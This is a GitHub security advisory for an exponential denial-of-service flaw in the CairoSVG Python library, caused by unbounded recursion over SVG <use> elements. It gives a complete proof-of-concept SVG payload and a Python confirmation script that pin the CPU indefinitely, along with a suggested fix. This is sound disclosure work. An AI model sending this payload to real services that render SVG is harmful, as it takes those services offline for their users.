# [H] CairoSVG vulnerable to Exponential DoS via recursive <use> element amplification

## Summary
Severity: High
Advisory: GHSA-f38f-5xpm-9r7c
CVE: CVE-2026-31899
CWE: CWE-400
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-13
Source: https://github.com/advisories/GHSA-f38f-5xpm-9r7c
Type: github-advisory

## Affected
- PyPI: `CairoSVG` — affected >=0 <2.9.0

## Details
## Summary

Kozea/CairoSVG (~300K downloads/week) has exponential denial of service via recursive `<use>` element amplification in `cairosvg/defs.py` (line ~335). This causes CPU exhaustion from a small input.

## Severity

High — CVSS 3.1: 7.5
Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

## Vulnerable Code

File: `cairosvg/defs.py` (line ~335), function `use()`

The `use()` function recursively processes `<use>` elements without any depth or count limits. With 5 levels of nesting and 10 references each, a 1,411-byte SVG triggers 10^5 = 100,000 render calls.

## Impact

- 1,411-byte SVG payload pins CPU at 100% indefinitely
- Memory stays flat at ~43MB — no OOM kill, process never terminates
- Any service accepting SVG input (thumbnailing, PDF generation, avatar rendering) is DoS-able
- Amplification factor: O(10^N) rendering calls from O(N) input

## Proof of Concept

Save as `poc.svg` and run `timeout 10 cairosvg poc.svg -o test.png`:

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <defs>
    <g id="a"><rect width="1" height="1"/></g>
    <g id="b"><use xlink:href="#a"/><use xlink:href="#a"/><use xlink:href="#a"/><use xlink:href="#a"/><use xlink:href="#a"/><use xlink:href="#a"/><use xlink:href="#a"/><use xlink:href="#a"/><use xlink:href="#a"/><use xlink:href="#a"/></g>
    <g id="c"><use xlink:href="#b"/><use xlink:href="#b"/><use xlink:href="#b"/><use xlink:href="#b"/><use xlink:href="#b"/><use xlink:href="#b"/><use xlink:href="#b"/><use xlink:href="#b"/><use xlink:href="#b"/><use xlink:href="#b"/></g>
    <g id="d"><use xlink:href="#c"/><use xlink:href="#c"/><use xlink:href="#c"/><use xlink:href="#c"/><use xlink:href="#c"/><use xlink:href="#c"/><use xlink:href="#c"/><use xlink:href="#c"/><use xlink:href="#c"/><use xlink:href="#c"/></g>
    <g id="e"><use xlink:href="#d"/><use xlink:href="#d"/><use xlink:href="#d"/><use xlink:href="#d"/><use xlink:href="#d"/><use xlink:href="#d"/><use xlink:href="#d"/><use xlink:href="#d"/><use xlink:href="#d"/><use xlink:href="#d"/></g>
  </defs>
  <use xlink:href="#e"/>
</svg>
```

Expected: `timeout` kills the process after 10 seconds (it never completes on its own).

Alternatively test with Python:
```python
import cairosvg, signal
signal.alarm(5)  # Kill after 5 seconds
try:
    cairosvg.svg2png(bytestring=open("poc.svg").read())
except:
    print("[!!!] CONFIRMED: CPU exhaustion — process did not complete in 5s")
```

## Suggested Fix

Add recursion depth counter to `use()` function. Cap at e.g. 10 levels. Also add total element budget to prevent amplification.

## References

- [CWE-400](https://cwe.mitre.org/data/definitions/400.html)

## Credit

Kai Aizen (SnailSploit) — Adversarial AI & Security Research

## References
- https://github.com/Kozea/CairoSVG/security/advisories/GHSA-f38f-5xpm-9r7c
- https://github.com/Kozea/CairoSVG/commit/6dde8685ed3f19837767bce7a13a5491e3d0e0bf
- https://github.com/Kozea/CairoSVG
